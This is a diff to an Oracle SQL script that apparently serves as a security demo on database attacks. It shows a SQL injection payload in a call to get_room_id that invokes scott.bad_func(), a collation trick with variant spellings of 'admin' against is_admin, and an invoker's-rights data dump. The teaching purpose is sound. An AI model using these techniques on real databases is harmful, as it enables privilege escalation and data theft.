@@ -69,6 +69,7 @@ select code from deathstar_rooms;
 
 -- Nothing strange to see...
 select * from user_roles;
+select * from users;
 
 -- Just wait until someone gets access to the room!
 call room_info.allow_room_access(2, 1);
@@ -77,7 +78,7 @@ call room_info.allow_room_access(2, 1);
 select * from user_roles;
 
 -- Nothing is shown in the logs
-select * from log_201910;
+select * from log_201911;
 
 
 /* 4. Invoker's rights  */
@@ -117,6 +118,7 @@ grant insert on secret_dump to public;
 truncate table secret_dump;
 select * from secret_dump;
 
+-- TODO: This should work!
 select deathstar.room_info.get_room_id(''') and scott.bad_func() = ''Y''--') from dual;
 
 
@@ -130,8 +132,8 @@ select * from secret_dump;
 /* 6. Collation Attack */
 ALTER SESSION SET NLS_SORT = BINARY_AI NLS_COMP = LINGUISTIC;
 
-select is_admin('aDMIN') from dual;
-select is_admin('Ädmin') from dual;
+select deathstar.is_admin('aDMIN') from dual;
+select deathstar.is_admin('Ädmin') from dual;
 
 -- Wie kann das ausgenutzt werden?
 -- LOGON-Trigger
